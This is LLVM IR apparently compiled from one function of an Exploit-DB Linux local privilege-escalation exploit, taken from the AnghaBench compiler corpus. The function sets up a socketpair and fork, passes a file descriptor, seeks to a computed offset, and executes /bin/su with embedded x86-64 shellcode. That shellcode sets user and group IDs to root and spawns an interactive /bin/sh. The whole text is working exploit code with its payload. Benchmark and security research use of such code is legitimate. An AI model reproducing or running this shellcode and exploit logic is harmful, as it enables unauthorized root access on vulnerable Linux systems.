; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_35161.c_parent.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_35161.c_parent.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [25 x i8] c"[+] Opening socketpair.\0A\00", align 1
@AF_UNIX = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [15 x i8] c"[-] socketpair\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"[+] Waiting for transferred fd in parent.\0A\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"[+] Received fd at %d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"[-] recv_fd\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"[+] Assigning fd %d to stderr.\0A\00", align 1
@.str.6 = private unnamed_addr constant [30 x i8] c"[+] Seeking to offset 0x%lx.\0A\00", align 1
@SEEK_SET = common dso_local global i32 0, align 4
@__const.parent.shellcode = private unnamed_addr constant [73 x i8] c"H1\FF\B0i\0F\05H1\FF\B0j\0F\05H1\F6@\B7\0F@\B6\02\B0!\0F\05H\BB//bin/shH\C1\EB\08SH\89\E7H1\DBf\BB-iSH\89\E1H1\C0PQWH\89\E6H1\D2\B0;\0F\05\00", align 16
@.str.7 = private unnamed_addr constant [34 x i8] c"[+] Executing su with shellcode.\0A\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"su\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.11 = private unnamed_addr constant [38 x i8] c"[+] Executing child from child fork.\0A\00", align 1
@.str.12 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@prog_name = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [3 x i8] c"-c\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @parent(i64 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca [2 x i32], align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [73 x i8], align 16
  %8 = alloca [32 x i8], align 16
  store i64 %0, i64* %3, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* @AF_UNIX, align 4
  %11 = load i32, i32* @SOCK_STREAM, align 4
  %12 = getelementptr inbounds [2 x i32], [2 x i32]* %4, i64 0, i64 0
  %13 = call i64 @socketpair(i32 %10, i32 %11, i32 0, i32* %12)
  %14 = icmp slt i64 %13, 0
  br i1 %14, label %15, label %17

15:                                               ; preds = %1
  %16 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %2, align 4
  br label %62

17:                                               ; preds = %1
  %18 = call i64 (...) @fork()
  %19 = icmp ne i64 %18, 0
  br i1 %19, label %20, label %50

20:                                               ; preds = %17
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0))
  %22 = getelementptr inbounds [2 x i32], [2 x i32]* %4, i64 0, i64 1
  %23 = load i32, i32* %22, align 4
  %24 = call i32 @recv_fd(i32 %23)
  store i32 %24, i32* %5, align 4
  %25 = load i32, i32* %5, align 4
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 %25)
  %27 = load i32, i32* %5, align 4
  %28 = icmp slt i32 %27, 0
  br i1 %28, label %29, label %31

29:                                               ; preds = %20
  %30 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  store i32 1, i32* %2, align 4
  br label %62

31:                                               ; preds = %20
  %32 = load i32, i32* %5, align 4
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i32 %32)
  %34 = call i32 @dup2(i32 2, i32 15)
  %35 = load i32, i32* %5, align 4
  %36 = call i32 @dup2(i32 %35, i32 2)
  %37 = load i64, i64* %3, align 8
  %38 = call i64 (...) @su_padding()
  %39 = sub i64 %37, %38
  store i64 %39, i64* %6, align 8
  %40 = load i64, i64* %6, align 8
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.6, i64 0, i64 0), i64 %40)
  %42 = load i32, i32* %5, align 4
  %43 = load i64, i64* %6, align 8
  %44 = load i32, i32* @SEEK_SET, align 4
  %45 = call i32 @lseek64(i32 %42, i64 %43, i32 %44)
  %46 = bitcast [73 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %46, i8* align 16 getelementptr inbounds ([73 x i8], [73 x i8]* @__const.parent.shellcode, i32 0, i32 0), i64 73, i1 false)
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.7, i64 0, i64 0))
  %48 = getelementptr inbounds [73 x i8], [73 x i8]* %7, i64 0, i64 0
  %49 = call i32 (i8*, i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %48, i8* null)
  br label %61

50:                                               ; preds = %17
  %51 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %52 = getelementptr inbounds [2 x i32], [2 x i32]* %4, i64 0, i64 0
  %53 = load i32, i32* %52, align 4
  %54 = call i32 @sprintf(i8* %51, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i32 %53)
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.11, i64 0, i64 0))
  %56 = load i32, i32* @prog_name, align 4
  %57 = sext i32 %56 to i64
  %58 = inttoptr i64 %57 to i8*
  %59 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %60 = call i32 (i8*, i8*, i8*, i8*, ...) @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0), i8* %58, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0), i8* %59, i8* null)
  br label %61

61:                                               ; preds = %50, %31
  store i32 0, i32* %2, align 4
  br label %62

62:                                               ; preds = %61, %29, %15
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @socketpair(i32, i32, i32, i32*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @recv_fd(i32) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i64 @su_padding(...) #1

declare dso_local i32 @lseek64(i32, i64, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, ...) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
